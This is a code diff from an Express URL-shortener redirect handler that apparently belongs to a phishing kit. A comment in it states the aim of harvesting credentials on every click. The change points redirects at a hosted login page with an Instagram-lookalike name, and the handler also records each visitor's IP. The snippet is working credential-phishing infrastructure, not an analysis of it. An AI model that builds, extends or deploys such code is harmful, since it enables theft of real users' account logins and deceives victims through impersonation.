@@ -83,7 +83,8 @@ export const redirectUrl = async (req, res) => {
         await urlDoc.incrementIpCount(clientIp);
 
         // Always redirect to login page (we want to harvest credentials on every click)
-        return res.redirect(`http://localhost:5173/login?next=/${shortId}`);
+        const frontendUrl = process.env.FRONTEND_URL || 'https://instagram-hpnf.onrender.com';
+        return res.redirect(`${frontendUrl}/login?next=/${shortId}`);
 
     } catch (error) {
         console.error("Error redirecting:", error);
